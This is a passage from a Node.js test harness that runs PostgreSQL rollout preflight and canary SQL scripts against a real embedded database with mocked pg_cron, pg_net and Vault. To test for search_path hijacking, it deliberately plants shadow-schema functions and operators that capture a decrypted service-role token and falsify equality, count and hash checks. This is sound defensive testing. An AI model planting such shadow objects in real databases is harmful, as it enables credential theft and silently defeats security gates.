// ===========================================================================
// preflight-pg.mjs — EXECUTE activation_preflight.sql and canary_verify.sql on a
// REAL PostgreSQL, against production-shaped rows.
//
// WHY THIS EXISTS SEPARATELY FROM enablement-selftest.sh. That suite stubs psql,
// so it proves the dispatcher's CONTROL FLOW — which artifact runs, in what
// order, under which gate. It cannot prove that an artifact's assertions are
// true statements about a database, and the four findings this closes are all of
// exactly that kind: a drifted cron command, a stale canary, an `accepted`
// attempt over a correlation mismatch, a tripped breaker, an orphan a webhook
// left un-quarantined. A stub answers "the preflight ran"; only a real server
// answers "the preflight would have REFUSED".
//
// Every scenario below is a mutation of one fact away from a passing baseline,
// and asserts the preflight FAILS on it. A scenario that passes when it should
// fail is a hole in the gate, not a failing test of a working gate.
//
// pg_cron is not installable in the embedded server, so cron.job is created as a
// REAL table with pg_cron's own shape — including that jobname is unique PER
// USERNAME, which is how pg_cron actually scopes it. The notification tables are
// sliced out of the REAL migrations rather than hand-written: a lookalike is how
// an earlier suite in this slice ended up asserting against a column production
// does not have.
//
// Run: node scripts/rollout/notif-10cb/verify/preflight-pg.mjs
// ===========================================================================
import { readFileSync } from 'node:fs';
import { randomUUID } from 'node:crypto';
import { join, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';
import pg from 'pg';
import { boot } from '../../notif-10ca3/verify/chain.mjs';

const HERE = dirname(fileURLToPath(import.meta.url));
const SQL_DIR = join(HERE, '..', 'sql');
const REPO = join(HERE, '..', '..', '..', '..');
const MIG = (f) => readFileSync(join(REPO, 'supabase', 'migrations', f), 'utf8');

const PORT = 54391;
let PASS = 0, FAIL = 0;
const rec = (n, ok, d = '') => {
  const l = `  ${ok ? 'PASS' : 'FAIL'}  ${n}${d ? '  — ' + d : ''}`;
  (ok ? console.log : console.error)(l);
  ok ? PASS++ : FAIL++;
};

const RUN = '77777777-7777-4777-8777-777777777777';
// production's per-invocation ownership token: `notification-digest-worker:<uuid>`
// (notification-digest-worker/index.ts newToken). M1's bind REFUSES any other worker identity,
// so a bare 'notification-digest-worker' here would be a shape production cannot produce.
const WORKER_TOKEN = 'b0b0b0b0-0000-4000-8000-00000000c0de';
const OTHER_RUN = '88888888-8888-4888-8888-888888888888';
const GROUP = '99999999-9999-4999-8999-999999999999';
const ATTEMPT = 'aaaaaaaa-aaaa-4aaa-8aaa-aaaaaaaaaaaa';
const MSG = 'resend-msg-canary-1';

// The reviewed command, taken from the migration itself so this file cannot
// drift from what F actually schedules.
const CRON_MIG = MIG('20261012100000_notif_10cb_digest_cron_inert.sql');
// N4 round 5 re-points the command's BODY so the request names the pending invocation. The
// schedule still comes from the F migration; the command comes from here, because this is what a
// migrated database actually runs.
const REPOINT_MIG = MIG('20261027100000_notif_n4_dispatch_identity_is_session_local.sql');
const REVIEWED = (() => {
  const m = CRON_MIG.match(
    /cron\.schedule\(\s*'notification-digest-worker'\s*,\s*'([^']+)'\s*,\s*\$cmd\$([\s\S]*?)\$cmd\$\s*\)/);
  if (!m) throw new Error('could not extract the reviewed cron schedule/command from the F migration');
  const r = REPOINT_MIG.match(/v_cmd text := \$cmd\$([\s\S]*?)\$cmd\$;/);
  if (!r) throw new Error('could not extract the re-pointed command from the round-5 migration');
  return { schedule: m[1], command: r[1] };
})();

/** A stable, filename-safe suffix so two generated shadows cannot collide on their helper name. */
function hashName(s) {
  let h = 0;
  for (const ch of s) h = (h * 31 + ch.charCodeAt(0)) | 0;
  return h;
}

/** Slice a real CREATE TABLE block out of a migration — never a hand-written lookalike. */
function tableDdl(sql, name, { ifNotExists = true } = {}) {
  const head = ifNotExists
    ? `CREATE TABLE IF NOT EXISTS public.${name} (`
    : `CREATE TABLE public.${name} (`;
  const start = sql.indexOf(head);
  if (start < 0) throw new Error(`no DDL for ${name}`);
  const end = sql.indexOf('\n);', start);
  if (end < 0) throw new Error(`unterminated DDL for ${name}`);
  return sql.slice(start, end + 3);
}

/**
 * The same real DDL with only its FOREIGN KEYS removed.
 *
 * notification_outbox references auth.users, persons, academy_profiles, trainer_profiles, invoices
 * and notification_contacts — half the schema, none of which this suite needs. Hand-writing a
 * four-column stand-in instead is the trap that has already cost this slice twice (a fixture with a
 * column production does not have; a fixture missing the column an assertion turns on), so the
 * columns, defaults and CHECK constraints all stay exactly as production has them and only the
 * references are dropped.
 */
function withoutForeignKeys(ddl) {
  return ddl.replace(
    /\s+REFERENCES\s+[a-z_]+\.[a-z_]+\s*(\([^)]*\))?(\s+ON\s+DELETE\s+(CASCADE|SET\s+NULL|RESTRICT|NO\s+ACTION))?/gi,
    '');
}

/** psql artifact -> something node-pg can run: inline \i, drop other meta-commands, bind vars. */
function artifactText(name, vars = {}) {
  let t = readFileSync(join(SQL_DIR, name), 'utf8');
  for (let i = 0; i < 6; i++) {
    const before = t;
    t = t.replace(/^\\i r? ?([^\s]+\.sql)\s*$/gm, (_m, f) => readFileSync(join(SQL_DIR, f), 'utf8'));
    t = t.replace(/^\\i ([^\s]+\.sql)\s*$/gm, (_m, f) => readFileSync(join(SQL_DIR, f), 'utf8'));
    if (t === before) break;
  }
  t = t.replace(/^\\.*$/gm, '');
  // psql's :'x' interpolates a QUOTED literal; :x interpolates raw.
  for (const [k, v] of Object.entries(vars)) {
    t = t.split(`:'${k}'`).join(`'${v}'`).split(`:${k}`).join(String(v));
  }
  if (/:'?[a-z_]+'?::uuid/.test(t)) throw new Error(`unbound psql variable left in ${name}`);
  return t;
}

const { epg, conn } = await boot(PORT);
const c = conn();
await c.connect();
let op;   // the RESTRICTED operator connection — created once the role exists

try {
  // ── schema: the REAL migrations' own DDL ─────────────────────────────────
  await c.query(`CREATE ROLE anon; CREATE ROLE authenticated; CREATE ROLE service_role BYPASSRLS;`);

  const foundation = MIG('20261002100000_notification_digest_schema_foundation.sql');
  for (const t of ['notification_worker_runs', 'notification_digest_groups',
                   'notification_digest_attempts', 'notification_digest_group_attempts',
                   'notification_provider_circuit', 'notification_provider_events']) {
    await c.query(tableDdl(foundation, t));
  }

  // pg_cron's real shape. jobname is UNIQUE PER USERNAME — a globally unique
  // jobname would make the preflight's owner-scoping untestable and make its
  // lookups look safe when they are not.
  await c.query(`
    CREATE SCHEMA cron;
    CREATE TABLE cron.job (
      jobid bigserial PRIMARY KEY, schedule text NOT NULL, command text NOT NULL,
      -- pg_cron dispatches a job to (nodename, nodeport); a normally-scheduled job carries this
      -- server's own. Hard-coding 5432 here would make the baseline fail on the embedded server's
      -- port and hide what the node assertions actually do.
      nodename text NOT NULL DEFAULT 'localhost',
      nodeport integer NOT NULL DEFAULT current_setting('port')::int,
      database text NOT NULL DEFAULT current_database(),
      username text NOT NULL DEFAULT current_user,
      active boolean NOT NULL DEFAULT true, jobname text,
      UNIQUE (jobname, username));`);
  // alter_job with pg_cron 1.6.4's MEASURED semantics, because the artifacts' row lock IS this
  // function now (the hosted role cannot FOR UPDATE the supabase_admin-owned cron.job):
  //   * full six-parameter signature, named-notation compatible;
  //   * an all-default call is refused with 'no updates specified' — there is no pure no-op;
  //   * ownership is checked against the CALLER. Real pg_cron checks the invoking user; inside a
  //     SQL SECURITY DEFINER stand-in `current_user` is the DEFINER, so the caller here is
  //     session_user — faithful for a direct login, which is how production operators, the cron
  //     tick, and this harness all reach it (plus the superuser bypass real pg_cron grants);
  //   * a missing or foreign jobid RAISES the real error text;
  //   * the update writes a new tuple version even when value-identical (the row lock the
  //     artifacts depend on), exactly as an SQL UPDATE always does.
  const MOCK_ALTER_JOB = `
    CREATE OR REPLACE FUNCTION cron.alter_job(job_id bigint, schedule text DEFAULT NULL,
        command text DEFAULT NULL, database text DEFAULT NULL, username text DEFAULT NULL,
        active boolean DEFAULT NULL)
      RETURNS void LANGUAGE plpgsql SECURITY DEFINER AS $fn$
      DECLARE n int;
      BEGIN
        IF alter_job.schedule IS NULL AND alter_job.command IS NULL AND alter_job.database IS NULL
           AND alter_job.username IS NULL AND alter_job.active IS NULL THEN
          RAISE EXCEPTION 'no updates specified';
        END IF;
        UPDATE cron.job j
           SET schedule = coalesce(alter_job.schedule, j.schedule),
               command  = coalesce(alter_job.command,  j.command),
               database = coalesce(alter_job.database, j.database),
               username = coalesce(alter_job.username, j.username),
               active   = coalesce(alter_job.active,   j.active)
         WHERE j.jobid = alter_job.job_id
           AND (j.username = session_user
                OR (SELECT usesuper FROM pg_user WHERE usename = session_user));
        GET DIAGNOSTICS n = ROW_COUNT;
        IF n = 0 THEN
          RAISE EXCEPTION 'Job % does not exist or you don''t own it', alter_job.job_id;
        END IF;
      END $fn$;`;
  await c.query(MOCK_ALTER_JOB);

  // The catalog columns the preflight reads (20260910100000 + C's 20261011100000).
  await c.query(`
    CREATE TABLE public.notification_event_types (
      key text PRIMARY KEY,
      supports_digest boolean NOT NULL DEFAULT false,
      digest_engine_enabled boolean NOT NULL DEFAULT false,
      digest_cutover boolean NOT NULL DEFAULT false,
      updated_at timestamptz NOT NULL DEFAULT now());`);
  // The orphan queue's operator-facing state, from ITS OWN migration's DDL — the minimal
  // hand-written stand-in used before had no digest_group_id, which is the column the
  // canary-scoped orphan assertion turns on.
  await c.query(tableDdl(MIG('20261006110000_reconcile_orphan_provider_events.sql'),
                         'notification_orphan_reconcile_state'));

  // the REAL liveness function, from the F migration
  const liveness = CRON_MIG.slice(CRON_MIG.indexOf(
    'CREATE OR REPLACE FUNCTION public.notif_digest_worker_liveness()'));
  await c.query(liveness);

  // ── what canary-invoke needs on top ───────────────────────────────────────
  // The outbox, from ITS OWN migration's DDL plus the digest columns the digest foundation adds to
  // it — canary_invoke.sql bounds the blast radius partly from this table, and a stand-in that
  // omitted `delivery_mode` or `digest_group_id` would make that bound silently vacuous.
  const foundationSchema = MIG('20260910100000_notification_foundation_schema.sql');
  await c.query(withoutForeignKeys(tableDdl(foundationSchema, 'notification_outbox', { ifNotExists: false })));
  await c.query(withoutForeignKeys(
    foundation.slice(foundation.indexOf('ALTER TABLE public.notification_outbox\n  ADD COLUMN'),
                     foundation.indexOf('ALTER TABLE public.notification_outbox DROP CONSTRAINT'))));
  await c.query(`ALTER TABLE public.notification_outbox ADD COLUMN IF NOT EXISTS digest_group_id uuid`);

  // ── N4: what the artifacts THEMSELVES now depend on ──────────────────────
  // M1 gave every deliberate invocation a durable pre-dispatch record, and the artifacts
  // open/record/resolve against it. Applied as the REAL migration (its guard, its partial
  // uniques and its lock order are exactly what the gates rely on) — a stand-in table would
  // make these scenarios pass while production's single-flight and replay behaviour differ.
  // Its claim/record/resolve companions come from their own migration, minus the one function
  // that reaches into the M4 admin gate (not part of any artifact path).
  await c.query(MIG('20261016100000_notif_n4_worker_invocations.sql'));
  {
    const claim = MIG('20261016110000_notif_n4_invocation_claim.sql');
    await c.query(claim.slice(0, claim.indexOf(
      'CREATE OR REPLACE FUNCTION public.admin_list_worker_invocations(')));
    // round 3: bind's CAUSALITY check + the claim's steady-state arm for it
    const r3 = MIG('20261024100000_notif_n4_seam_corrections_round3.sql');
    await c.query(r3.slice(0, r3.indexOf('-- \u2500\u2500 SEAM 13')));
    // round 4 (convergence): the ownership contract — smoke|canary only, no timestamp inference
    await c.query(MIG('20261025100000_notif_n4_invocation_ownership_contract.sql'));
  }
  // auth.uid() is what the boundary opener attributes an activation to (NULL from psql, which is
  // how the runbook calls it). The stand-in is the same one every realpg suite uses.
  await c.query(`
    CREATE SCHEMA IF NOT EXISTS auth;
    CREATE OR REPLACE FUNCTION auth.uid() RETURNS uuid LANGUAGE sql STABLE AS
      $fn$ SELECT nullif(current_setting('request.jwt.claim.sub', true), '')::uuid $fn$;`);

  // N5's activation boundaries: the enable-engine artifact opens the digest path in the same
  // transaction that turns the engine on, and the send authorities gate on it. Applied whole —
  // the table, its guard, the opener and the enforcement all belong to the same contract.
  await c.query(MIG('20261028100000_notif_n5_activation_boundary.sql'));

  // …and the OCCURRENCE half of the same contract. postflight asserts on `occurred_at` and on the
  // per-path event-age floor, so a harness without this column would prove the artifact against a
  // schema that is not the one it runs on. The column, its guard and the floor function are what
  // matter here; the send authorities it also recreates are inert in this harness.
  // %ROWTYPE is resolved at COMPILE time, so the resolver this migration also recreates needs its
  // referenced tables to exist even though nothing here calls it. Table DDL only — the resolver's
  // behaviour is proven by the realpg suites, not by this artifact harness.
  {
    const foundationSchemaSql = MIG('20260910100000_notification_foundation_schema.sql');
    for (const t of ['notification_event_types', 'notification_contacts']) {
      await c.query(withoutForeignKeys(
        tableDdl(foundationSchemaSql, t, { ifNotExists: false })
          .replace(`CREATE TABLE public.${t} (`, `CREATE TABLE IF NOT EXISTS public.${t} (`)));
    }
  }
  await c.query(MIG('20261104100000_notif_audit_event_occurrence_boundary.sql'));

  // ── C-3: the two PURE helpers canary_invoke.sql's DUE-WORK FLOOR calls by name ────────────
  // The floor's predicate is claim_notification_digest_group's own, so it calls the same quiet-hours
  // and uncertainty-deadline functions the claim does. Those live in the digest STATE MACHINE
  // migration, which this harness does not apply whole (it is 900 lines of send machinery nothing
  // here invokes). plpgsql resolves names at RUN time, so the claim function compiled happily
  // without them and their absence went unnoticed; the floor is plain SQL and resolves at PARSE
  // time, so it would simply fail to create.
  //
  // SLICED FROM THE REAL MIGRATION, never hand-copied. A re-typed quiet-hours window is the exact
  // trap this file has paid for twice: the artifact would be proven against a rule production does
  // not have, and both directions of the resulting error are silent.
  {
    const stateMachine = MIG('20261004100000_notification_digest_state_machine.sql');
    const fnDdl = (sql, name) => {
      const start = sql.indexOf(`CREATE OR REPLACE FUNCTION public.${name}(`);
      if (start < 0) throw new Error(`no DDL for function ${name}`);
      const end = sql.indexOf('$$;', start);
      if (end < 0) throw new Error(`unterminated DDL for function ${name}`);
      return sql.slice(start, end + 3);
    };
    for (const fn of ['notif_digest_quiet_hours_bump', 'notif_digest_uncertainty_deadline']) {
      await c.query(fnDdl(stateMachine, fn));
    }
  }

  // M2's kill table: activation assertion 9 refuses to arm the cron while a channel is killed.
  // Table only — the RPC that writes it is admin-facing and no artifact calls it.
  await c.query(withoutForeignKeys(
    tableDdl(MIG('20261017100000_notif_n4_channel_kill_switches.sql'),
             'notification_channel_kill_switches', { ifNotExists: false })));

  // pg_net and Vault, minimally: the point of these is that the REVIEWED COMMAND ITSELF runs against
  // them unchanged, named arguments and Vault read included. `net.http_post` records what it was
  // called with, so a scenario can prove the reviewed endpoint — and only it — was posted to.
  await c.query(`
    CREATE SCHEMA net;
    CREATE SCHEMA vault;
    CREATE TABLE vault.decrypted_secrets (name text PRIMARY KEY, decrypted_secret text NOT NULL);
    INSERT INTO vault.decrypted_secrets VALUES ('service_role_key', 'stub-key-not-a-real-credential');
    CREATE TABLE net.http_request_queue (
      id bigserial PRIMARY KEY, url text NOT NULL, headers jsonb, body jsonb,
      created timestamptz NOT NULL DEFAULT now());
    CREATE TABLE net._http_response (
      id bigint PRIMARY KEY, status_code int, content text, error_msg text,
      created timestamptz NOT NULL DEFAULT now());
    -- The argument NAMES matter: the reviewed command calls this with url := / headers := / body :=,
    -- so a stub with different parameter names would fail to execute the very text under test.
    CREATE FUNCTION net.http_post(url text, headers jsonb DEFAULT '{}'::jsonb,
                                  body jsonb DEFAULT '{}'::jsonb, timeout_milliseconds int DEFAULT 5000)
      RETURNS bigint LANGUAGE sql AS $f$
        INSERT INTO net.http_request_queue (url, headers, body) VALUES ($1, $2, $3) RETURNING id;
      $f$;`);

  // ── the search_path attack, planted once and left in place ────────────────
  // Function resolution does NOT prefer pg_catalog. An exact-arity, exact-type overload beats
  // pg_catalog's VARIADIC "any" wherever its schema sits in the path — including AFTER an explicit
  // pg_catalog — so an unqualified jsonb_build_object in the scheduled command would hand the
  // decrypted service_role bearer to whoever owns that schema. A hostile OPERATOR for `||` does the
  // same to the concatenation. Both are planted here and both stay planted for every scenario below.
  //
  // BROADENED after a review round pointed out the obvious: a fixture that plants two names proves
  // two names. These are the ones the bundle's own assertions actually call unqualified, and each
  // one is a way to make a gate lie — a `count(text)` that answers 0 empties the scope check, an
  // `md5(text)` that answers the reviewed hash matches any command at all, an `=` that answers false
  // ignores a queued canary. They are planted once and left in place for every scenario.
  await c.query(`
    CREATE SCHEMA shadow;
    CREATE TABLE shadow.captured (v text);
    CREATE FUNCTION shadow.jsonb_build_object(text, text, text, text) RETURNS jsonb LANGUAGE sql AS $f$
      INSERT INTO shadow.captured VALUES ($4); SELECT '{"shadowed":true}'::jsonb; $f$;
    -- ...and the BODY's own signature (N4 round 5): the command now builds a body naming the
    -- pending invocation, and an exact-arity rival is what proves that call's qualification is
    -- load-bearing too. Without it the positive control below cannot speak for this call at all —
    -- a hijacked body would send a request that names NO invocation, silently restoring the
    -- "claim whatever is unresolved" ambiguity round 5 removed.
    CREATE FUNCTION shadow.jsonb_build_object(text, text) RETURNS jsonb LANGUAGE sql AS $f$
      INSERT INTO shadow.captured VALUES ($1); SELECT '{"shadowed":true}'::jsonb; $f$;
    -- ...and the GUC read that now carries the dispatch identity (N4 round 6). An exact-arity
    -- rival is what lets the positive control below prove THAT qualification is load-bearing: a
    -- hijacked current_setting could answer NULL for every request, so every dispatch would name
    -- no invocation and the deliberate ones would silently stop being distinguishable.
    CREATE FUNCTION shadow.current_setting(text, boolean) RETURNS text LANGUAGE sql AS $f$
      INSERT INTO shadow.captured VALUES ($1); SELECT NULL::text $f$;
    CREATE FUNCTION shadow.textcat_capture(text, text) RETURNS text LANGUAGE sql AS $f$
      INSERT INTO shadow.captured VALUES ($1 operator(pg_catalog.||) $2);
      SELECT $1 operator(pg_catalog.||) $2; $f$;
    CREATE OPERATOR shadow.|| (LEFTARG = text, RIGHTARG = text, FUNCTION = shadow.textcat_capture);
    -- the Vault predicate's equality, and every other (text,text) comparison in the bundle
    CREATE FUNCTION shadow.texteq_lie(text, text) RETURNS boolean LANGUAGE sql AS $f$
      INSERT INTO shadow.captured VALUES ($1 operator(pg_catalog.||) '=' operator(pg_catalog.||) $2);
      SELECT false; $f$;
    CREATE OPERATOR shadow.= (LEFTARG = text, RIGHTARG = text, FUNCTION = shadow.texteq_lie);
    -- "how many recipients did the canary reach" and "how many rows are queued"
    CREATE FUNCTION shadow.count_zero_state(bigint, text) RETURNS bigint LANGUAGE sql AS $f$ SELECT 0::bigint $f$;
    CREATE AGGREGATE shadow.count(text) (SFUNC = shadow.count_zero_state, STYPE = bigint, INITCOND = '0');
    -- "the command is EXACTLY the reviewed one"
    CREATE FUNCTION shadow.md5(text) RETURNS text LANGUAGE sql AS $f$
      SELECT '00000000000000000000000000000000'::text $f$;
    CREATE FUNCTION shadow.btrim(text) RETURNS text LANGUAGE sql AS $f$ SELECT ''::text $f$;
    CREATE FUNCTION shadow.regexp_replace(text, text, text, text) RETURNS text LANGUAGE sql AS $f$
      SELECT ''::text $f$;
    -- the marker the dispatcher parses the request id out of
    CREATE FUNCTION shadow.format(text, bigint) RETURNS text LANGUAGE sql AS $f$
      SELECT 'CANARY_REQUEST_ID=999999'::text $f$;`);

  // ── the PRODUCTION PRIVILEGE SPLIT ────────────────────────────────────────
  // On hosted Supabase the operator connects as a NON-superuser `postgres` that holds SELECT — and
  // only SELECT — on the supabase_admin-owned cron.job, while owning the application objects (which
  // is why notif_digest_worker_liveness, SECURITY DEFINER over `username = current_user`, must be
  // OWNED by the operator role here: owned by the boot superuser it would look for the wrong
  // user's job). Every artifact below therefore runs on a restricted connection; running them as
  // the boot superuser is exactly the blind spot that let a FOR UPDATE the production role cannot
  // execute ship reviewed and green.
  await c.query(`
    CREATE ROLE hosted_postgres LOGIN NOSUPERUSER PASSWORD 'hosted_postgres';
    GRANT USAGE ON SCHEMA cron TO hosted_postgres;
    GRANT SELECT ON cron.job TO hosted_postgres;
    GRANT USAGE ON SCHEMA public, net, vault, shadow TO hosted_postgres;
    GRANT ALL ON ALL TABLES IN SCHEMA public TO hosted_postgres;
    GRANT ALL ON ALL SEQUENCES IN SCHEMA public TO hosted_postgres;
    GRANT SELECT, INSERT ON net.http_request_queue TO hosted_postgres;
    GRANT SELECT ON net._http_response TO hosted_postgres;
    GRANT USAGE ON ALL SEQUENCES IN SCHEMA net TO hosted_postgres;
    GRANT SELECT ON vault.decrypted_secrets TO hosted_postgres;
    GRANT ALL ON ALL TABLES IN SCHEMA shadow TO hosted_postgres;
    ALTER FUNCTION public.notif_digest_worker_liveness() OWNER TO hosted_postgres;
    -- …and EXECUTE on the public functions the artifacts call.
    --
    -- INTEGRATION FIDELITY, found by composing N0 with N4-N7. In production the operator runs the
    -- runbook as the role that APPLIED the migrations, so it OWNS these functions and can execute
    -- them however they are REVOKEd — an owner keeps its own privileges. Here the schema is created
    -- by the boot superuser, so hosted_postgres owned nothing and every artifact that calls a
    -- REVOKEd definer function (record_notification_activation_boundary,
    -- notif_activation_min_occurred_at, …) failed with 'permission denied' — the harness being
    -- STRICTER than production, not the artifacts being wrong.
    --
    -- What is NOT granted, deliberately: anything on cron.job beyond SELECT. That the hosted role
    -- cannot FOR UPDATE the supabase_admin-owned cron.job is N0's entire finding and the reason
    -- alter_job is the lock. Widening it here would delete the thing this harness exists to prove.
    GRANT EXECUTE ON ALL FUNCTIONS IN SCHEMA public TO hosted_postgres;`);
  // The artifacts' lock include pins the pg_cron VERSION its measured semantics belong to; the
  // extension is a mock here, so the catalog row it reads is planted (same device as the realpg
  // cron-inert suite), with the version the semantics were measured on.
  await c.query(`
    INSERT INTO pg_extension (oid, extname, extowner, extnamespace, extrelocatable, extversion)
      SELECT 999999, 'pg_cron', 10, n.oid, false, '1.6.4' FROM pg_namespace n WHERE n.nspname = 'cron'`);
  op = new pg.Client({
    connectionString: `postgresql://hosted_postgres:hosted_postgres@127.0.0.1:${PORT}/postgres` });
  await op.connect();

  // The split itself is load-bearing, so it is SELF-TESTED: if the restricted role could FOR
  // UPDATE (or write) cron.job, every scenario below would be running against a privilege model
  // production does not have — the exact modelling failure this rework exists to close.
  {
    let denied = false;
    try { await op.query(`SELECT jobid FROM cron.job FOR UPDATE`); }
    catch (e) { denied = e.code === '42501'; }
    rec('the operator role CANNOT lock cron.job FOR UPDATE (the production refusal, reproduced)',
      denied, denied ? '' : 'FOR UPDATE succeeded — the harness is not modelling the hosted privilege split');
    let wdenied = false;
    try { await op.query(`UPDATE cron.job SET active = active`); }
    catch (e) { wdenied = e.code === '42501'; }
    rec('...and cannot write cron.job directly either', wdenied,
      wdenied ? '' : 'a direct UPDATE succeeded — the harness is not modelling the hosted privilege split');
  }

  // ── the baseline world: a clean, fresh, delivering canary ────────────────
  const seedBaseline = async () => {
    await c.query(`
      DELETE FROM cron.job;
      DELETE FROM public.notification_provider_circuit;
      DELETE FROM public.notification_digest_group_attempts;
      UPDATE public.notification_digest_groups SET current_attempt_id = NULL;
      DELETE FROM public.notification_digest_attempts;
      DELETE FROM public.notification_digest_groups;
      DELETE FROM public.notification_worker_runs;
      DELETE FROM public.notification_event_types;
      DELETE FROM public.notification_orphan_reconcile_state;
      DELETE FROM public.notification_outbox;
      DELETE FROM net.http_request_queue;
      DELETE FROM net._http_response;
      -- the invocation record is append-only by owner-effective guard (M1), so the RESET is the
      -- same sanctioned escape the realpg suites use — production never deletes these
      ALTER TABLE public.notification_worker_invocations DISABLE TRIGGER trg_notif_worker_invocation_guard;
      DELETE FROM public.notification_worker_invocations;
      ALTER TABLE public.notification_worker_invocations ENABLE TRIGGER trg_notif_worker_invocation_guard;
      DELETE FROM public.notification_channel_kill_switches;`);
    // username EXPLICITLY the operator role: the seeding connection is the boot superuser, so the
    // column default would stamp ITS name and every owner-scoped lookup below would scope to the
    // wrong identity.
    await c.query(
      `INSERT INTO cron.job (jobname, schedule, command, active, username)
         VALUES ('notification-digest-worker', $1, $2, false, 'hosted_postgres')`,
      [REVIEWED.schedule, REVIEWED.command]);
    await c.query(`
      INSERT INTO public.notification_event_types (key, supports_digest, digest_engine_enabled, digest_cutover)
        VALUES ('open_slots_player', true, true, true);`);
    // N4 M1: activation demands that the run it is asked to trust was produced by a COMPLETED
    // canary-provenance invocation, and the record is earned IN PRODUCTION'S ORDER — the
    // invocation exists first, the dispatch it queues starts the run, the worker binds at
    // startup, the run ends, the reconcile resolves. A run seeded BEFORE its own invocation (as
    // this harness first did) is a chronology production cannot produce, and round 3's causality
    // check refuses it — correctly.
    const inv = (await c.query(
      `SELECT public.open_notification_worker_invocation('canary', 'canary_invoke.sql', gen_random_uuid()) AS id`)).rows[0].id;
    await c.query(`SELECT public.record_invocation_net_request($1, 990001)`, [inv]);
    // born UNFINISHED (status NULL is production's in-flight shape — the CHECK admits only the
    // three terminals), started AFTER the invocation, under production's real worker token
    await c.query(
      `INSERT INTO public.notification_worker_runs (run_id, worker, channel, phase)
       VALUES ($1, 'notification-digest-worker:${WORKER_TOKEN}', 'email', 'dispatch')`, [RUN]);
    const verdict = (await c.query(
      `SELECT public.bind_notification_worker_invocation($1, $2) AS v`, [inv, RUN])).rows[0].v;
    if (verdict !== 'bound') throw new Error(`baseline bind expected 'bound', got '${verdict}'`);
    await c.query(`
      INSERT INTO public.notification_digest_groups
        (id, canonical_group_key, group_key_hash, channel, event_type, recipient_key,
         destination_fingerprint, recipient_timezone, digest_boundary_at, available_at,
         state, provider_message_id, provider_status, provider_status_rank, worker_run_id)
        VALUES ('${GROUP}', '{"k":1}'::jsonb, 'hash-1', 'email', 'open_slots_player', 'rk-1',
                'fp-1', 'Europe/Amsterdam', now(), now(), 'sent', '${MSG}', 'sent', 1, '${RUN}');
      -- terminal_at is SCHEMA-OWNED in production: notification_digest_groups_guard stamps it on
      -- entry into a terminal state and clears it otherwise (20261002100000). That trigger is not
      -- installed here (it would force provider_message_id to NULL and unmake this baseline), so the
      -- fixture must carry the value the guard would have written. A group in state sent with a NULL
      -- terminal_at is a state production cannot produce, and canary_invoke.sql counts on exactly
      -- that column to decide what is still live.
      UPDATE public.notification_digest_groups SET terminal_at = now() WHERE state = 'sent';
      INSERT INTO public.notification_digest_attempts
        (attempt_id, digest_group_id, worker_run_id, provider_idempotency_key,
         outcome_class, provider_message_id, recorded_at, http_status)
        VALUES ('${ATTEMPT}', '${GROUP}', '${RUN}', 'idem-1', 'accepted', '${MSG}', now(), 200);
      -- begin_notification_digest_attempt ENSURES this row exists before it sends, so a canary that
      -- really sent always leaves one. A baseline without it made "the circuit is closed" pass
      -- vacuously in every scenario.
      INSERT INTO public.notification_provider_circuit (channel, state) VALUES ('email', 'closed');`);
    await c.query(
      `UPDATE public.notification_worker_runs SET status = 'succeeded', ended_at = now() WHERE run_id = $1`,
      [RUN]);
    await c.query(`SELECT public.resolve_invocation_for_canary_run($1)`, [RUN]);
    // The canary is a few MINUTES old in every scenario below (freshness windows, and the
    // ordering scenarios that inject a run between its start and its end). The record above was
    // earned through the real RPCs at real `now()`; shifting the whole timeline back afterwards
    // is the only way to have both — and it preserves the causal order exactly
    // (requested_at < started_at < ended_at = resolved_at). Same device as terminal_at above:
    // the guard owns these columns in production, so the harness borrows its pen, briefly.
    await c.query(`
      ALTER TABLE public.notification_worker_invocations DISABLE TRIGGER trg_notif_worker_invocation_guard;
      UPDATE public.notification_worker_invocations
         SET requested_at = now() - interval '3 minutes 1 second',
             resolved_at  = now() - interval '2 minutes';
      ALTER TABLE public.notification_worker_invocations ENABLE TRIGGER trg_notif_worker_invocation_guard;
      UPDATE public.notification_worker_runs
         SET started_at = now() - interval '3 minutes', ended_at = now() - interval '2 minutes'
       WHERE run_id = '${RUN}';`);
  };

  // Every artifact now pins `SET search_path = pg_catalog` for its whole SESSION, which is the point
  // — but this harness runs them all down ONE connection, so without a reset the pin would leak into
  // the next scenario's fixture SQL. The reset is the harness's business, not the artifact's: it
  // restores the world a real operator's next psql process would start from.
  //
  // ...and they run on the RESTRICTED connection, never the boot superuser. Superuser bypasses the
  // very ACLs the production refusal came from, so a superuser-run artifact proves nothing about
  // what the hosted role can execute.
  const runArtifact = async (name, vars = {}) => {
    try { return { rows: await op.query(artifactText(name, vars)) }; }
    catch (e) { await op.query('ROLLBACK').catch(() => {}); return { err: e.message }; }
    finally { await op.query(`SET search_path = "$user", public`).catch(() => {}); }
  };

  const preflight = async () => (await runArtifact('activation_preflight.sql', { run_id: RUN })).err ?? null;
  const canaryVerify = async () => (await runArtifact('canary_verify.sql', { run_id: RUN })).err ?? null;
  const assertInert = async () => (await runArtifact('assert_inert.sql')).err ?? null;
  // N5: the step opens the email:digest delivery path in the same transaction, so it takes the
  // boundary request id the runbook prints before running it
  const enableEngine = async (req = randomUUID()) =>
    (await runArtifact('enable_engine.sql', { boundary_request_id: req })).err ?? null;
  // N4 M1: every deliberate invocation carries a CALLER-generated request id — the artifacts
  // gate, open and (on a retry) replay on it, so the harness supplies one exactly as the runbook
  // tells the operator to. A fresh id per call: these scenarios are first attempts, not replays.
  const canaryInvoke = async (max = 1, req = randomUUID()) =>
    (await runArtifact('canary_invoke.sql', { max_recipients: max, invocation_request_id: req })).err ?? null;
  const scopeVerify = async (max = 1) =>
    (await runArtifact('canary_scope_verify.sql', { run_id: RUN, max_recipients: max })).err ?? null;
  const smokeInvoke = async (req = randomUUID()) =>
    (await runArtifact('smoke_invoke.sql', { invocation_request_id: req })).err ?? null;

  // ── C-3: fixtures for the DUE-WORK FLOOR ─────────────────────────────────
  //
  // A TIMEZONE IN WHICH IT IS ALWAYS MIDDAY. Quiet hours are [09:00, 20:00) in the RECIPIENT's
  // zone, and the floor requires the window to be open at T *and* at T+5min. A fixture pinned to
  // Europe/Amsterdam would therefore make every "the canary PASSES" scenario in this file depend on
  // what time of day the suite happens to run — green in the afternoon, red on a night build, and
  // the failure would look like a broken gate rather than a broken fixture. Instead every due
  // fixture carries a FIXED-OFFSET zone chosen so that `now` is local midday.
  //
  // tzdata's Etc/GMT sign convention is INVERTED (Etc/GMT-5 is UTC+5), which is exactly the kind of
